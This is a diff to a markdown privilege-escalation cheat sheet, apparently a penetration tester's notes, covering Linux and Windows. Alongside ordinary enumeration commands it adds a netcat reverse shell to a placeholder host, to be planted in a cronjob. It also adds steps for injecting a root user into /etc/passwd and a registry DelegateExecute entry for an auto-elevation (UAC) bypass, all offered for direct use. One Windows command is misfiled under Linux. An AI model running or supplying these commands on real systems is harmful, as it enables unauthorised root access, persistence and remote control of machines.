@@ -3,6 +3,7 @@
 ###### Basic Privesc Enumeration for Linux
 ```
 whoami
+whoami /priv // Privileges info
 ---
 id
 ---
@@ -133,8 +134,18 @@ e', Path // Lists display name, start mode and path
 ```
 ###### AutoElevate Binaries for Windows
 ```
-[powershell]
+regedit //opens Registry Editor 
+---
 reg query HKEY_CURRENT_USER
+---
+REG ADD HKCU\path\to\Shell\Open\command /v DelegateExecute /t REG_SZ
+```
+###### 
+Insecure file permissions for Windows
+```
+Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'} // shows service/path
+---
+
 ```
 ***
 #### The Automated Stuff
@@ -152,6 +163,9 @@ windows-privesc-check2.exe -A // All files and Dirs
 --
 windows-privesc-check2.exe --pyshell // o.O 
 ---
+procmon.exe
+---
+sigcheck.exe -a -m C:\path\to\binarie
 ```
 ###### Linux 
 ```
@@ -161,7 +175,18 @@ windows-privesc-check2.exe --pyshell // o.O
 ---
 ./unix-privesc-check detailed 
 ```
-##### Examples
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP><PORT> >/tmp/f" // write this to a file in a cronjob
+---
+```
+```
+Injecting a superuser into /etc/passwd
+openssl passwd <newpassword> // Populate password hash
+-
+echo "<NEW USERNAME>:<HASH>:0:0:root:/root:/bin/bash" >> /etc/passwd // add user to passwd
+- 
+su <new username> // rooted ;)
+```
 ###### Windows
 ```
 [Examples]
@@ -171,5 +196,10 @@ whoami /groups // Look for Medium integrity level
 net user admin NewPassword // Try set new password (Most likely will fail)
 -
 powershell.exe Start-Process cmd.exe -Verb runAs // Privesc
+```
+```
+wmic service where caption="Service" get name, caption, state, startmode // Check start mode and active status
+---
 
+---
 ```
